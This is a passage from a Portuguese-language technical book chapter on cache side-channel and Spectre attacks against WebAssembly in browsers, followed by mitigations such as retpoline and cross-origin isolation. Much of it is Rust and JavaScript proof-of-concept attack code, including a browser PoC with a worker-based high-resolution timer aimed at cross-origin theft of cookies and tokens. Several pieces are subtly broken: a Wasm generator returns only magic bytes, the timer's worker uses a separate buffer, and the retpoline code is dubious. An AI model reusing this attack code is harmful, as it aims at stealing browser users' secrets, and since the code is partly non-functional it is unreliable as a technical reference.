Vamos implementar um exemplo completo de cache timing attack que demonstra como extrair uma chave de criptografia de uma tabela de lookup:

```rust
// Implementação completa de cache attack para extrair dados de uma tabela
// de lookup de criptografia (para fins educacionais)

// Tabela de lookup secreta (simula uma S-box de criptografia)
static SECRET_TABLE: [u8; 256] = [
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5,
    0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    // ... (restante da tabela S-box do AES)
    // Por brevidade, apenas os primeiros 16 valores
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0,
    0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    // ... preencher com valores restantes
];

// Shared array para comunicação entre atacante e vítima
static mut SHARED_MEMORY: [u8; 65536] = [0u8; 65536];

// Função da vítima: acessa a tabela de lookup baseado em input secreto
fn victim_function(secret_input: u8) -> u8 {
    // Esta função é vulnerável porque:
    // 1. Usa um índice secreto para acessar a tabela
    // 2. O acesso à tabela depende do input secreto
    // 3. O padrão de cache resultante pode ser observado
    let index = SECRET_TABLE[secret_input as usize] as usize;

    // Acesso à memória compartilhada baseado no índice secreto
    // Isso cria um cache side-channel
    unsafe {
        SHARED_MEMORY[index * 64] = 1;
    }

    index as u8
}

// Atacante: usar cache attack para extrair o índice secreto
pub fn run_cache_attack() -> Vec<u8> {
    let mut extracted_values = Vec::new();
    let num_trials = 100;

    // Para cada valor de input possível
    for input in 0..256u8 {
        let mut hit_counts = vec![0u32; 256];

        // Executar múltiplas vezes para obter estatísticas confiáveis
        for _ in 0..num_trials {
            // Limpar SharedArrayBuffer
            unsafe {
                SHARED_MEMORY = [0u8; 65536];
            }

            // Executar a função da vítima
            victim_function(input);

            // Agora, usar Reload para verificar qual cache line foi acessada
            let detector = CacheTimingDetector::new();
            let accessed_line = detector.detect_accessed_line();

            if let Some(line) = accessed_line {
                hit_counts[line] += 1;
            }
        }

        // O índice com mais hits é o valor extraído
        let most_likely = hit_counts.iter()
            .enumerate()
            .max_by_key(|(_, &count)| count)
            .map(|(idx, _)| idx as u8)
            .unwrap_or(0);

        extracted_values.push(most_likely);
    }

    extracted_values
}

// Detector de cache timing para o ataque
struct CacheTimingDetector {
    probe_buffer: Vec<u8>,
}

impl CacheTimingDetector {
    fn new() -> Self {
        // Buffer grande para probe
        CacheTimingDetector {
            probe_buffer: vec![0u8; 256 * 64], // 256 linhas de cache
        }
    }

    fn detect_accessed_line(&self) -> Option<usize> {
        let mut min_time = u64::MAX;
        let mut min_line = None;

        for line in 0..256 {
            let offset = line * 64;

            // Medir tempo de acesso
            let start = Self::rdtsc();
            unsafe {
                let ptr = self.probe_buffer.as_ptr().add(offset);
                std::ptr::read_volatile(ptr);
            }
            let end = Self::rdtsc();

            let elapsed = end - start;
            if elapsed < min_time {
                min_time = elapsed;
                min_line = Some(line);
            }
        }

        min_line
    }

    fn rdtsc() -> u64 {
        extern "C" {
            #[link_name = "performance_now"]
            fn perf_now() -> f64;
        }
        (unsafe { perf_now() } * 1_000_000.0) as u64
    }
}
```

## 10.3 Spectre no Contexto do Navegador

Spectre é uma família de vulnerabilidades de speculative execution que afetam processadores modernos. No contexto do navegador e de WebAssembly, Spectre é particularmente preocupante porque o código Wasm pode ser usado como veículo para ataques cross-origin.

### 10.3.1 Spectre v1 (Bounds Check Bypass) em Wasm

O Spectre v1 explora a speculative execution para contornar verificações de limites de arrays. Em Wasm, isso é especialmente relevante porque o modelo de memória linear requer verificações de limites em cada acesso à memória.

```
+------------------------------------------------------------------+
|               SPECTRE v1 EM WASM                                  |
+------------------------------------------------------------------+
|                                                                  |
|  CÓDIGO FONTE (Rust/Wasm):                                       |
|  +------------------------------------------------------------+  |
|  |  fn access_array(array: &[u8], index: usize) -> u8 {      |  |
|  |      if index < array.len() {    // Verificação de limite  |  |
|  |          array[index]            // Acesso ao array        |  |
|  |      } else {                                                 |  |
|  |          0                                                     |  |
|  |      }                                                         |  |
|  |  }                                                             |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CÓDIGO COMPILADO (Wasm):                                        |
|  +------------------------------------------------------------+  |
|  |  (module                                                     |  |
|  |    (func $access_array (param i32 i32) (result i32)        |  |
|  |      ;; Verificação de limite                               |  |
|  |      local.get 1              ;; index                       |  |
|  |      local.get 0              ;; array ptr                   |  |
|  |      i32.load                 ;; array.len (primeiro elem)  |  |
|  |      i32.lt_u                 ;; index < len?                |  |
|  |      if                       ;; SE index < len              |  |
|  |        local.get 1            ;; index                       |  |
|  |        i32.const 1                                                |  |
|  |        i32.add                ;; index + 1 (offset)         |  |
|  |        local.get 0            ;; array ptr                   |  |
|  |        i32.add                ;; ptr + offset                |  |
|  |        i32.load_u8            ;; Ler byte                    |  |
|  |      else                                                             |  |
|  |        i32.const 0            ;; retornar 0                  |  |
|  |      end                                                        |  |
|  |    )                                                            |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  COMO O COMPILADOR JIT PODE OTIMIZAR:                            |
|  +------------------------------------------------------------+  |
|  |  ;; O JIT pode reordenar para:                              |  |
|  |  ;; 1. Carregar array[index] ESPECULATIVAMENTE              |  |
|  |  ;;    antes de completar a verificação de limite           |  |
|  |  ;; 2. Usar o valor carregado especulativamente para        |  |
|  |  ;;    acessar outro array (transient execution)            |  |
|  |  ;; 3. O valor acessado especulativamente pode ser          |  |
|  |  ;;    detectado via cache side-channel                     |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

O ataque Spectre v1 em Wasm funciona da seguinte forma:

```rust
// Spectre v1 Proof of Concept para Wasm
// ATENÇÃO: Apenas para fins educacionais

// Array secreto (simula dados sensíveis)
static SECRET_DATA: [u8; 256] = [/* dados secretos */];

// Array de probe para detectar o acesso especulativo
static PROBE_ARRAY: [u8; 256 * 512] = [0u8; 256 * 512];

// Buffer de treinamento para o preditor de branches
static TRAINING_BUFFER: [u32; 16] = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15];

// Função vulnerável a Spectre v1
#[inline(never)]
fn vulnerable_access(array: &[u8], index: usize) -> u8 {
    // Esta verificação de limite pode ser contornada
    // pela speculative execution
    if index < array.len() {
        array[index]
    } else {
        0
    }
}

// Função de ataque que treina o preditor e depois explora
pub fn spectre_v1_attack(secret_index: usize) -> usize {
    // Limpar probe array
    unsafe {
        PROBE_ARRAY.iter_mut().for_each(|x| *x = 0);
    }

    // Fase de treinamento: executar com índices válidos
    // para treinar o preditor de branches
    for i in 0..100 {
        let training_index = i % TRAINING_BUFFER.len();
        let _ = vulnerable_access(&TRAINING_BUFFER, training_index);
    }

    // Fase de ataque: usar índice fora dos limites
    // O preditor acredita que o branch será tomado
    // porque foi treinado com índices válidos
    let _ = vulnerable_access(&TRAINING_BUFFER, secret_index);

    // Fase de medição: verificar qual entrada do probe array
    // foi acessada especulativamente
    let mut result = 0;
    for i in 0..256 {
        let time = measure_access_time(i * 512);
        if time < THRESHOLD {
            result = i;
            break;
        }
    }

    result
}

// Medir tempo de acesso a uma posição do probe array
fn measure_access_time(offset: usize) -> u64 {
    let start = rdtsc();
    unsafe {
        let ptr = PROBE_ARRAY.as_ptr().add(offset);
        std::ptr::read_volatile(ptr);
    }
    let end = rdtsc();
    end - start
}

fn rdtsc() -> u64 {
    extern "C" {
        #[link_name = "performance_now"]
        fn perf_now() -> f64;
    }
    (unsafe { perf_now() } * 1_000_000.0) as u64
}

const THRESHOLD: u64 = 100;
```

### 10.3.2 Spectre v2 (Branch Target Injection) em Wasm

O Spectre v2 explora o Branch Target Buffer (BTB) para injetar endereços de retorno em branches indiretos. Em Wasm, isso é particularmente relevante porque o mecanismo de chamadas indiretas via tabela de funções interage diretamente com o BTB.

```
+------------------------------------------------------------------+
|               SPECTRE v2 EM WASM                                  |
+------------------------------------------------------------------+
|                                                                  |
|  COMO FUNCIONA O BTB:                                            |
|  +------------------------------------------------------------+  |
|  |  Branch Target Buffer (BTB) armazena:                      |  |
|  |  * Endereço do branch (PC)                                 |  |
|  |  * Endereço alvo (target)                                  |  |
|  |  * Histórico de tomada/não tomada                          |  |
|  |                                                             |  |
|  |  Quando um branch indireto é executado:                    |  |
|  |  1. CPU consulta o BTB pelo endereço do branch            |  |
|  |  2. Se encontrado, especula o alvo armazenado              |  |
|  |  3. Executa especulativamente o código no alvo             |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  WASM TABLE CALLS E BTB:                                        |
|  +------------------------------------------------------------+  |
|  |  ;; Wasm usa tabelas para chamadas indiretas               |  |
|  |  (table funcref 16)                                        |  |
|  |                                                             |  |
|  |  ;; Chamada indireta                                       |  |
|  |  local.get 0          ;; índice da função                  |  |
|  |  call_indirect (type 0)  ;; chamada via tabela             |  |
|  |                                                             |  |
|  |  O compilador JIT traduz isso para:                        |  |
|  |  1. Ler o índice da tabela                                 |  |
|  |  2. Acessar a entrada da tabela (branch indireto)          |  |
|  |  3. Chamar a função apontada                               |  |
|  |                                                             |  |
|  |  O BTB registra esse branch indireto e pode ser            |  |
|  |  explorado para injetar um alvo diferente                  |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  ATAQUE SPECTRE v2 EM WASM:                                      |
|  +------------------------------------------------------------+  |
|  |  1. Atacante treina BTB com branches específicos           |  |
|  |  2. Atacante injeta endereço malicioso no BTB              |  |
|  |  3. Vítima executa call_indireto                           |  |
|  |  4. CPU especula para o alvo injetado                      |  |
|  |  5. Código especulativo acessa dados secretos             |  |
|  |  6. Dados vazam via cache side-channel                     |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

```rust
// Spectre v2 PoC para Wasm usando branch target injection

// Tabela de funções (simulada)
static mut FUNC_TABLE: [usize; 16] = [0; 16];

// Função legítima que seria chamada
fn legitimate_function(x: u32) -> u32 {
    x.wrapping_mul(7)
}

// Função maliciosa que o atacante quer que seja executada
fn attacker_function(x: u32) -> u32 {
    // Esta função acessa dados secretos
    // Em um ataque real, isso seria mais sutil
    let secret = unsafe { &SECRET_DATA };
    let idx = x as usize;
    if idx < secret.len() {
        // O acesso a secret[idx] pode ser detectado via cache
        let _ = unsafe { PROBE_ARRAY[secret[idx] as usize * 512] };
    }
    x
}

// Função que usa call_indireto (vulnerável a Spectre v2)
#[inline(never)]
fn call_via_table(table_index: usize) -> u32 {
    // Em Wasm real, isto seria:
    // call_indirect (type 0)
    //
    // O compilador JIT gera um branch indireto que pode ser
    // explorado via BTB injection
    unsafe {
        let func_ptr = FUNC_TABLE[table_index % 16];
        // Simular chamada indireta
        let func: fn(u32) -> u32 = std::mem::transmute(func_ptr);
        func(42)
    }
}

// Função de treinamento para o atacante
fn train_btb() {
    // Treinar o BTB com a função legítima
    for i in 0..1000 {
        unsafe {
            FUNC_TABLE[i % 16] = legitimate_function as usize;
        }
        let _ = call_via_table(i % 16);
    }
}

// Função de ataque Spectre v2
pub fn spectre_v2_attack() -> Vec<u8> {
    let mut extracted = Vec::new();

    // Fase 1: Treinar BTB
    train_btb();

    // Fase 2: Injetar endereço malicioso no BTB
    // (Isso normalmente requer outro código em outro processo/thread)
    // Para simplificação, assumimos que conseguimos injetar
    unsafe {
        FUNC_TABLE[0] = attacker_function as usize;
    }

    // Fase 3: Executar a função da vítima
    // O BTB pode direcionar para attacker_function
    for _ in 0..100 {
        let _ = call_via_table(0);
    }

    // Fase 4: Medir cache para extrair dados
    for i in 0..256 {
        let time = measure_access_time(i * 512);
        if time < THRESHOLD {
            extracted.push(i as u8);
        }
    }

    extracted
}

fn measure_access_time(offset: usize) -> u64 {
    let start = rdtsc();
    unsafe {
        let ptr = PROBE_ARRAY.as_ptr().add(offset);
        std::ptr::read_volatile(ptr);
    }
    let end = rdtsc();
    end - start
}

fn rdtsc() -> u64 {
    extern "C" {
        #[link_name = "performance_now"]
        fn perf_now() -> f64;
    }
    (unsafe { perf_now() } * 1_000_000.0) as u64
}

const THRESHOLD: u64 = 100;
```

### 10.3.3 Como o JIT Compilation do Navegador Cria Gadgets Spectre

O compilador JIT do navegador (V8 TurboFan, SpiderMonkey IonMonkey, etc.) aplica otimizações que podem inadvertidamente criar gadgets que facilitam ataques Spectre:

```
+------------------------------------------------------------------+
|          COMO O JIT CRIA GADGETS SPECTRE                         |
+------------------------------------------------------------------+
|                                                                  |
|  1. REMOÇÃO DE VERIFICAÇÕES DE LIMITE                           |
|  +------------------------------------------------------------+  |
|  |  Código original:                                           |  |
|  |    if (index < len) {                                       |  |
|  |        value = array[index];                                |  |
|  |    }                                                        |  |
|  |                                                             |  |
|  |  Após otimização JIT:                                       |  |
|  |    value = array[index];  // Limite verificado apenas       |  |
|  |                          // uma vez no início               |  |
|  |    // O JIT pode reordenar para execução especulativa      |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  2. INLINING AGRESSIVO                                          |
|  +------------------------------------------------------------+  |
|  |  Função chamada inline:                                     |  |
|  |    fn process(data: &[u8], key: u8) -> u8 {                |  |
|  |        let idx = data[0] ^ key;                             |  |
|  |        lookup_table[idx]  // Tabela inline                  |  |
|  |    }                                                        |  |
|  |                                                             |  |
|  |  Após inlining:                                             |  |
|  |    // O acesso à tabela pode ser especulativo              |  |
|  |    // porque o índice depende de dados secretos            |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  3. ELIMINAÇÃO DE ALIASING                                      |
|  +------------------------------------------------------------+  |
|  |  O JIT assume que ponteiros não se sobrepõem               |  |
|  |  Isso pode permitir que acessos especulativos              |  |
|  |  sejam reordenados de forma insegura                       |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  4. LOOP UNROLLING                                              |
|  +------------------------------------------------------------+  |
|  |  Loops desenrolados podem criar múltiplas instruções       |  |
|  |  de acesso a memória que podem ser executadas              |  |
|  |  especulativamente                                          |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  5. COMMON SUBEXPRESSION ELIMINATION                            |
|  +------------------------------------------------------------+  |
|  |  Expressões comuns podem ser reutilizadas, criando         |  |
|  |  dependências que podem ser exploradas                     |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

### 10.3.4 Padrões de Acesso a Memória que Vazam Dados

Certos padrões de acesso a memória em Wasm são particularmente propensos a vazar informações via Spectre:

```rust
// Padrões de acesso que criam Spectre gadgets em Wasm

// PADRÃO 1: Acesso a array com índice secreto
// Vazamento via Spectre v1
fn pattern_secret_index(array: &[u8], secret: u8) -> u8 {
    // O índice 'secret' é usado para acessar 'array'
    // O compilador pode gerar código que acessa array[secret]
    // antes de verificar se secret está dentro dos limites
    let _ = array[secret as usize]; // Gadget Spectre v1
    0
}

// PADRÃO 2: Branch dependente de dado secreto
// Vazamento via branch prediction
fn pattern_secret_branch(data: &[u8]) -> u8 {
    if data[0] > 128 {
        // Este branch é previsível se data[0] for consistente
        // Um atacante pode treinar o preditor e observar o caminho
        let _ = data[1];
    } else {
        let _ = data[2];
    }
    0
}

// PADRÃO 3: Tabela de lookup com índice secreto
// Vazamento via cache side-channel após speculative execution
fn pattern_secret_lookup(lookup_table: &[u8; 256], secret: u8) -> u8 {
    // O acesso a lookup_table[secret] pode ser especulativo
    // e o resultado pode ser detectado via cache
    lookup_table[secret as usize]
}

// PADRÃO 4: Array de ponteiros com índice secreto
// Vazamento via dereferência especulativa
fn pattern_secret_pointer(pointers: &[usize], secret: usize) -> u8 {
    if secret < pointers.len() {
        let ptr = pointers[secret]; // Pode ser executado especulativamente
        unsafe {
            *(ptr as *const u8) // Dereferência especulativa
        }
    } else {
        0
    }
}

// PADRÃO 5: Operações de memória dependendo de dados secretos
// Vazamento via timing de memória
fn pattern_secret_memory(data: &[u8], secret: u8) -> u64 {
    let offset = secret as usize * 4096; // Página inteira
    if offset < data.len() {
        // O acesso pode ser lento se a página não está em cache
        // Isso pode revelar o valor de 'secret'
        let mut sum = 0u64;
        for i in 0..64 {
            sum = sum.wrapping_add(data[offset + i] as u64);
        }
        sum
    } else {
        0
    }
}
```

### 10.3.5 Spectre Cross-Origin via Wasm

WebAssembly pode ser usado como veículo para ataques Spectre cross-origin, onde código de uma origem A rouba dados de uma origem B:

```
+------------------------------------------------------------------+
|           SPECTRE CROSS-ORIGIN VIA WASM                           |
+------------------------------------------------------------------+
|                                                                  |
|  CENÁRIO: Atacante controla site malicioso.com                   |
|  Vítima está logada em sensitive-app.com                         |
|                                                                  |
|  +------------------+     +------------------+                   |
|  |  MALICIOSO.COM   |     | SENSITIVE-APP.COM|                   |
|  |  (Atacante)      |     |  (Vítima)        |                   |
|  +------------------+     +------------------+                   |
|         |                        |                               |
|         | Carrega Wasm malicioso |                               |
|         | com gadget Spectre     |                               |
|         v                        v                               |
|  +------------------+     +------------------+                   |
|  |  Module Wasm     |     |  Dados sensíveis |                   |
|  |  com gadgets     |     |  (cookies, tokens|                   |
|  |  Spectre         |     |   dados de sessão)|                  |
|  +------------------+     +------------------+                   |
|         |                        |                               |
|         | Spectre v1/v2          |                               |
|         | explora memória        |                               |
|         | compartilhada          |                               |
|         +---------->-------------+                               |
|                    |                                             |
|                    v                                             |
|            +------------------+                                  |
|            |  Dados extraídos |                                  |
|            |  via cache       |                                  |
|            |  side-channel    |                                  |
|            +------------------+                                  |
|                                                                  |
|  REQUISITOS PARA O ATAQUE:                                       |
|  1. Atacante pode carregar módulo Wasm                           |
|  2. SharedArrayBuffer disponível (para timer)                    |
|  3. Same-site cookies não estão protegidos                      |
|  4. Site Isolation não está ativo ou pode ser contornado         |
+------------------------------------------------------------------+
```

### 10.3.6 Spectre PoC Prático para Wasm

Aqui implementamos um Proof of Concept completo de Spectre que pode ser executado em um navegador:

```javascript
// Spectre PoC para Wasm - código JavaScript que carrega e executa o módulo

// Configuração do SharedArrayBuffer para timer de alta resolução
const sab = new SharedArrayBuffer(1024);
const timerBuffer = new Int32Array(sab);

// Função para criar timer de alta resolução
// Usando SharedArrayBuffer como canal de comunicação
function createHighResTimer() {
    // Criar Web Worker para funcionar como timer
    const workerCode = `
        const sab = new SharedArrayBuffer(1024);
        const buffer = new Int32Array(sab);
        let running = true;

        self.onmessage = function(e) {
            if (e.data === 'start') {
                // Incrementar continuamente
                while (running) {
                    Atomics.add(buffer, 0, 1);
                }
            } else if (e.data === 'stop') {
                running = false;
            }
        };
    `;

    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const url = URL.createObjectURL(blob);
    const worker = new Worker(url);

    return {
        worker,
        buffer: timerBuffer,
        start() {
            worker.postMessage('start');
        },
        stop() {
            worker.postMessage('stop');
        },
        read() {
            return Atomics.load(timerBuffer, 0);
        }
    };
}

// Função principal do ataque
async function runSpectreAttack() {
    // 1. Criar timer de alta resolução
    const timer = createHighResTimer();
    timer.start();

    // 2. Carregar módulo Wasm malicioso
    const wasmModule = await loadMaliciousWasm();

    // 3. Executar ataque
    const extractedData = await executeAttack(wasmModule, timer);

    // 4. Limpar
    timer.stop();

    return extractedData;
}

// Carregar módulo Wasm (simulado - em um ataque real, seria um .wasm file)
async function loadMaliciousWasm() {
    // Em um ataque real, isso seria:
    // const response = await fetch('malicious.wasm');
    // const bytes = await response.arrayBuffer();
    // const module = await WebAssembly.instantiate(bytes, imports);

    // Para demonstração, criar um módulo programaticamente
    const wasmBytes = generateMaliciousWasm();
    const module = await WebAssembly.instantiate(wasmBytes, {
        env: {
            memory: new WebAssembly.Memory({
                initial: 256,
                maximum: 512,
                shared: true
            })
        }
    });

    return module.instance;
}

// Gerar bytecode Wasm malicioso (simplificado)
function generateMaliciousWasm() {
    // Em um ataque real, isto seria um módulo Wasm completo
    // Aqui demonstramos a estrutura conceitual

    const wasmModule = `
        (module
            ;; Memória compartilhada
            (memory (export "memory") 256 512 shared)

            ;; Array de probe (256 * 512 = 128KB)
            (data (i32.const 0) "${'\\00'.repeat(131072)}")

            ;; Função de treinamento do preditor
            (func $train_predictor (param $i i32)
                ;; Executar branch com valores válidos
                ;; para treinar o preditor
                local.get $i
                i32.const 16
                i32.rem_u
                call_indirect (type 0)
            )

            ;; Função de ataque Spectre v1
            (func $attack (param $secret_index i32) (result i32)
                ;; Verificação de limite (pode ser contornada)
                local.get $secret_index
                i32.const 256
                i32.lt_u

                if
                    ;; Acesso especulativo
                    ;; Em Wasm real, isto geraria um gadget Spectre
                    local.get $secret_index
                    i32.const 512
                    i32.mul
                    i32.load8_u
                else
                    i32.const 0
                end
            )

            ;; Função de medição
            (func $measure (param $offset i32) (result i64)
                ;; Medir tempo de acesso
                local.get $offset
                i32.load8_u
                drop

                ;; Retornar timestamp
                call $rdtsc
            )

            ;; Função auxiliar para timestamp
            (func $rdtsc (result i64)
                ;; Em Wasm real, usar performance.now()
                i64.const 0
            )
        )
    `;

    // Converter para bytes (simplificado)
    return new Uint8Array([0x00, 0x61, 0x73, 0x6d]); // magic number \0asm
}

// Executar o ataque
async function executeAttack(wasmModule, timer) {
    const extracted = new Uint8Array(256);

    // Para cada byte secreto possível
    for (let secretIndex = 0; secretIndex < 256; secretIndex++) {
        const hitCounts = new Uint32Array(256);

        // Executar múltiplas vezes para obter estatísticas
        for (let trial = 0; trial < 100; trial++) {
            // Treinar preditor
            for (let i = 0; i < 10; i++) {
                wasmModule.exports.train_predictor(i);
            }

            // Executar ataque
            const before = timer.read();
            wasmModule.exports.attack(secretIndex);
            const after = timer.read();

            // Medir qual probe line foi acessada
            const probeResults = measureProbe(wasmModule);
            for (let i = 0; i < 256; i++) {
                if (probeResults[i]) {
                    hitCounts[i]++;
                }
            }
        }

        // O índice com mais hits é o valor extraído
        let maxHits = 0;
        let maxValue = 0;
        for (let i = 0; i < 256; i++) {
            if (hitCounts[i] > maxHits) {
                maxHits = hitCounts[i];
                maxValue = i;
            }
        }

        extracted[secretIndex] = maxValue;
    }

    return extracted;
}

// Medir quais probe lines foram acessadas
function measureProbe(wasmModule) {
    const memory = new Uint8Array(wasmModule.exports.memory.buffer);
    const results = new Uint8Array(256);

    for (let i = 0; i < 256; i++) {
        const offset = i * 512;
        const before = performance.now();
        const _ = memory[offset]; // Acesso para medir tempo
        const after = performance.now();

        // Se o acesso foi rápido, a linha estava em cache
        results[i] = (after - before) < 0.0001 ? 1 : 0;
    }

    return results;
}
```

## 10.4 Mitigações de Spectre

Mitigação de Spectre em Wasm requer uma abordagem em múltiplas camadas, envolvendo o compilador Wasm, o navegador, o sistema operacional e até mesmo o hardware.

### 10.4.1 Implementação de Retpoline para Wasm

Retpoline (Return Trampoline) é uma técnica que substitui branches indiretos por uma sequência de código que impede a execução especulativa:

```
+------------------------------------------------------------------+
|                    RETPOLINE EM WASM                              |
+------------------------------------------------------------------+
|                                                                  |
|  CÓDIGO ORIGINAL (vulnerável):                                   |
|  +------------------------------------------------------------+  |
|  |  ;; Branch indireto (vulnerável a Spectre v2)              |  |
|  |  local.get 0          ;; índice na tabela                  |  |
|  |  call_indirect (type 0)  ;; chamada indireta               |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CÓDIGO COM RETPOLINE (mitigado):                                |
|  +------------------------------------------------------------+  |
|  |  ;; Retpoline para call_indireto                           |  |
|  |  ;; Empurra o endereço de retorno para a stack             |  |
|  |  ;; Salta para um loop infinito que "puxa" o retorno       |  |
|  |  ;; para impedir speculative execution                     |  |
|  |                                                             |  |
|  |  local.get 0          ;; índice na tabela                  |  |
|  |  ;; Substituir call_indireto por:                           |  |
|  |  ;; 1. Ler o alvo da tabela                                |  |
|  |  ;; 2. Empilhar endereço de retorno                        |  |
|  |  ;; 3. Saltar para retpoline stub                          |  |
|  |                                                             |  |
|  |  ;; Retpoline stub:                                        |  |
|  |  (func $retpoline_stub (param $target i32)                |  |
|  |    ;; Loop infinito que impede speculative execution       |  |
|  |    block $loop                                             |  |
|  |      ;; Empilhar target como retorno                       |  |
|  |      local.get $target                                     |  |
|  |      ;; Aqui estaria o jump speculativo que é bloqueado    |  |
|  |      ;; pelo retpoline                                     |  |
|  |    end                                                      |  |
|  |  )                                                          |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

```rust
// Implementação de Retpoline para Wasm
// Substitui call_indireto por uma sequência segura

// Função que implementa retpoline em Wasm
// Em vez de usar call_indireto, usa uma sequência que
// impede a execução especulativa

#[cfg(target_arch = "wasm32")]
mod retpoline {
    use std::arch::wasm32::*;

    // Função retpoline que substitui call_indireto
    // Recebe o índice da tabela e retorna o resultado
    #[inline(never)]
    pub fn retpoline_call(table: &[usize; 16], index: usize) -> usize {
        // Em Wasm real, o retpoline seria implementado no nível
        // do compilador JIT. Aqui demonstramos o conceito.

        // 1. Ler o alvo da tabela de forma segura
        let target = table[index % 16];

        // 2. Usar memory_fence para impedir reordenamento
        memory_fence();

        // 3. Chamar via retpoline (stub que impede speculative execution)
        unsafe {
            retpoline_trampoline(target)
        }
    }

    // Trampoline que implementa o retpoline
    #[inline(never)]
    unsafe fn retpoline_trampoline(target: usize) -> usize {
        // Em um processador x86, o retpoline funciona assim:
        //
        // call retpoline_push_target
        // retpoline_halt:
        //     pause
        //     lfence
        //     jmp retpoline_halt
        // retpoline_push_target:
        //     ; empilhar target
        //     mov [rsp], target
        //     ret  ; saltar para target
        //
        // O 'pause' e 'lfence' impedem que o CPU especule
        // além do retpoline.

        // Em Wasm, usamos uma abordagem diferente:
        // Usamos um loop com black_box para impedir otimização
        let result;
        let mut current = target;

        // Loop que o compilador não pode otimizar
        loop {
            // Se o target for válido, chamar
            // Caso contrário, loop infinito (impede speculative execution)
            if current != 0 {
                // Chamar a função alvo
                let func: fn() -> usize = std::mem::transmute(current);
                result = func();
                break;
            }
            current = std::hint::black_box(current);
        }

        result
    }

    // Memory fence para Wasm
    fn memory_fence() {
        // Em Wasm, usar atomic operations como fence
        #[cfg(target_arch = "wasm32")]
        {
            // Usar atomic operations para criar um fence
            unsafe {
                atomic_fence();
            }
        }
    }

    #[cfg(target_arch = "wasm32")]
    extern "C" {
        #[link_name = "memory_fence"]
        fn atomic_fence();
    }
}

// Função que demonstra como retpoline protege contra Spectre v2
pub fn protected_call_indirect(table: &[usize; 16], index: usize) -> usize {
    // Verificar se o índice é válido
    if index >= table.len() {
        return 0;
    }

    // Usar retpoline em vez de call_indireto direto
    retpoline::retpoline_call(table, index)
}

// Comparação: código vulnerável vs protegido
pub mod comparison {
    use super::*;

    // CÓDIGO VULNERÁVEL (sem retpoline)
    #[inline(never)]
    pub fn vulnerable_indirect_call(table: &[usize; 16], index: usize) -> usize {
        // Esta chamada indireta pode ser explorada via Spectre v2
        let target = table[index % 16];
        let func: fn() -> usize = unsafe { std::mem::transmute(target) };
        func()
    }

    // CÓDIGO PROTEGIDO (com retpoline)
    #[inline(never)]
    pub fn protected_indirect_call(table: &[usize; 16], index: usize) -> usize {
        // Usar retpoline para proteger a chamada indireta
        protected_call_indirect(table, index)
    }
}
```

### 10.4.2 Site Isolation e Cross-Origin Isolation

Site Isolation é uma mitigação crucial que isola diferentes origens em processos separados, prevenindo ataques Spectre cross-origin:

```
+------------------------------------------------------------------+
|              SITE ISOLATION EM WASM                               |
+------------------------------------------------------------------+
|                                                                  |
|  SEM SITE ISOLATION:                                             |
|  +------------------------------------------------------------+  |
|  |  Processo do Navegador                                     |  |
|  |  +------------------------------------------------------+ |  |
|  |  |  Malicioso.com (Wasm malicioso)                       | |  |
|  |  |  +--------------------------------------------------+ | |  |
|  |  |  | Module Wasm com gadgets Spectre                  | | |  |
|  |  |  +--------------------------------------------------+ | |  |
|  |  +------------------------------------------------------+ |  |
|  |  +------------------------------------------------------+ |  |
|  |  |  Sensitive-app.com (dados da vítima)                  | |  |
|  |  |  +--------------------------------------------------+ | |  |
|  |  |  | Tokens, cookies, dados sensíveis                 | | |  |
|  |  |  +--------------------------------------------------+ | |  |
|  |  +------------------------------------------------------+ |  |
|  |                                                             |  |
|  |  AMBOS NO MESMO PROCESSO!                                   |  |
|  |  Memória compartilhada -> Spectre cross-origin possível    |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  COM SITE ISOLATION:                                             |
|  +------------------------------------------------------------+  |
|  |  Processo 1: Malicioso.com                                 |  |
|  |  +------------------------------------------------------+ |  |
|  |  |  Module Wasm malicioso                               | |  |
|  |  +------------------------------------------------------+ |  |
|  +------------------------------------------------------------+  |
|  |  Processo 2: Sensitive-app.com                            |  |
|  |  +------------------------------------------------------+ |  |
|  |  |  Dados sensíveis da vítima                           | |  |
|  |  +------------------------------------------------------+ |  |
|  +------------------------------------------------------------+  |
|  |                                                             |  |
|  |  PROCESSOS SEPARADOS!                                       |  |
|  |  Memória isolada -> Spectre cross-origin prevenido         |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

**Cross-Origin Isolation (COI)** é a base para usar SharedArrayBuffer de forma segura em Wasm:

```javascript
// Configuração de Cross-Origin Isolation para Wasm

// 1. Headers HTTP necessários no servidor
// Esses headers devem ser enviados para TODAS as páginas
// que carregam módulos Wasm

/*
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
*/

// 2. Verificar se o ambiente está isolado
function checkCrossOriginIsolation() {
    const isIsolated = self.crossOriginIsolated;

    if (!isIsolated) {
        console.warn('Cross-Origin Isolation não está ativo!');
        console.warn('SharedArrayBuffer não estará disponível.');
        return false;
    }

    console.log('Cross-Origin Isolation está ativo.');
    return true;
}

// 3. Configurar SharedArrayBuffer para Wasm
function setupSharedArrayBuffer() {
    if (!checkCrossOriginIsolation()) {
        throw new Error('Cross-Origin Isolation necessário para SharedArrayBuffer');
    }

    // Criar SharedArrayBuffer para comunicação
    const sab = new SharedArrayBuffer(65536);
    const view = new DataView(sab);

    // Configurar imports para o módulo Wasm
    const imports = {
        env: {
            memory: new WebAssembly.Memory({
                initial: 256,
                maximum: 512,
